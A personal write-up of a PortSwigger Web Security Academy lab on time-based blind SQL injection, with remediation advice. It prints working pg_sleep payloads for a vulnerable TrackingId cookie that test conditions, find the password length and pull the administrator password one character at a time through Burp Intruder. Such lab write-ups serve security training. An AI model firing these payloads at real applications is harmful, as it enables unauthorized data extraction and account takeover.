# PortSwigger Lab: Blind SQL Injection with Time Delays and Information Retrieval

##  Project Overview
This repository contains my solution and write-up for the **"Blind SQL injection with time delays and information retrieval"** lab from PortSwigger's Web Security Academy. Building upon basic time-based attacks, this lab demonstrates how to exfiltrate actual data (like passwords) from a hidden database using conditional logic.

##  What I Learned (Key Concepts)
* **Conditional Time Delays:** Learned how to construct `CASE WHEN ... THEN` SQL statements to trigger a database sleep (`pg_sleep()`) *only* if a specific condition returns True.
* **Data Exfiltration:** Understood the process of extracting hidden data character by character (blind enumeration) by measuring response times.
* **Advanced Burp Intruder Automation:** Gained hands-on experience using Burp Intruder to brute-force specific string offsets and using **Resource Pools (Maximum Concurrent Requests = 1)** to guarantee accurate time-delay measurements.
* **SQL Functions:** Mastered the practical usage of database functions like `LENGTH()` (to find string size) and `SUBSTRING()` (to extract individual characters).

---

##  Walkthrough & Solution

### 1. Enumeration & Length Discovery
The application uses a vulnerable `TrackingId` cookie. First, I verified conditional execution using standard boolean triggers:
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Next, I determined the length of the `administrator` user's password by changing the comparison operator:
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
When checking `LENGTH(password)>20`, the delay stopped, confirming the password was exactly **20 characters long**.

### 2. Automated Extraction (Burp Intruder)
To extract the password without manual guessing, I configured an attack using Burp Intruder:
1. Positioned payload markers around the target character checking the first position:
   ```sql
   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
   ```
2. Set the payload type to a simple alphanumeric list (`a-z`, `0-9`).
3. Set the **Resource Pool** max concurrent requests to **1** to prevent overlapping network delays.
4. Analyzed the results column for responses taking roughly 10,000+ milliseconds. The character causing the delay was noted.
5. Repeated this process for positions 1 through 20.

**Extracted Administrator Password:** `ov5pv0ff45198tuuya1c`

Using these credentials, I logged into the Administrator account and successfully solved the lab! 🏆

---

##  Remediation (Prevention)
* **Prepared Statements:** Enforce parameterized queries to treat all user inputs (including cookies) strictly as data literals, not executable SQL.
* **Defense in Depth:** Deploy a Web Application Firewall (WAF) to detect and block suspicious database keywords (`pg_sleep`, `SUBSTRING`) inside HTTP request components.
